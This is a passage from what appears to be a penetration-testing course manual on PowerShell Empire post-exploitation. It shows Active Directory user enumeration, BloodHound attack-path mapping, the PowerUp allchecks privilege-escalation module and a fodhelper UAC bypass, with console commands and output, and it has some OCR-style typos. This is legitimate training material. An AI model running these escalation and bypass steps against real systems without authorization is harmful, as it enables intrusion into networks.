```
cn                              : Jeff_Admin
whenchanged                   : 2/19/2019  7:15:57 PM
instancetype                  : 4
uncreated                     : 12613
objectguid                    : 7bbdcc8c-e139-478c-86dd- ab6def0f1d58
lastlogoff                    : 1/1/1601  1:00:00 AM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=corp,DC=com
dscoperepropagationdata       : [2/19/2019  1:05:25 PM, 2/19/2019  12:56:22 PM, 1/1/1601  12:00:00 ...
```

```
Listing 837 - Executing the module
```

In addition to the enumeration tools in the PowerView subcategory, the *situational_awareness* category also includes a wide variety of network and port scanners.

The *BloodHound* module is especially noteworthy. It automates much of PowerView's functionality, collecting all computers, users, and groups in the domain as well as all currently logged-in users. The output is stored in CSV files suitable for use with the backend *BloodHound* application,[725] which uses graph theory[726] to highlight often-overlooked and highly complex attack paths in an Active Directory environment.

# 23.2.2 Credentials and Privilege Escalation

The *privesc* category contains privilege escalation modules. One of the more interesting modules in this group is *powerup/allechecks*.[727] It uses several techniques based on misconfigurations such as unquoted service paths, improper permissions on service executables, and much more.

```
(Empire: powershell/situational_awareness/network/powerview/get_user) > **usemodule powershell/privesc/powerup/allchecks**

(Empire: powershell/privesc/powerup/allchecks) > **exeoute**
Job started: N459AD

[ ] Running Invoke-AllChecks

[ ] Checking if user is in a local group with administrative privileges...
[+] **User is in a local group that grants administrative privileges!**
[ ] Run a BypassUAC attack to elevate privileges to admin.
...
```

```
Listing 838 - Using the PowerUp allchecks module
```

The *bypassuac_fodhelper* module is quite useful if we have access to a local administrator account. Depending on the local Windows version, this module can bypass UAC and launch a high-integrity PowerShell Empire agent:

```
(Empire: S2Y5Xw1L) > **usemodule privesc/bypassuac_fodhelper**

(Empire: powershell/privesc/bypassuac_fodhelper) > **info**
```

[725] (BloodHoundAD, 2019). https://github.com/BloodHoundAD/BloodHound
[726] (Andy Robbins, 2017). https://nee4j.com/blog/bloodhound-how-graphs-changed-the-way-hackers-attack/
[727] (PowerShellEmpire, 2019). https://www.powershilempire.com/?page_id=378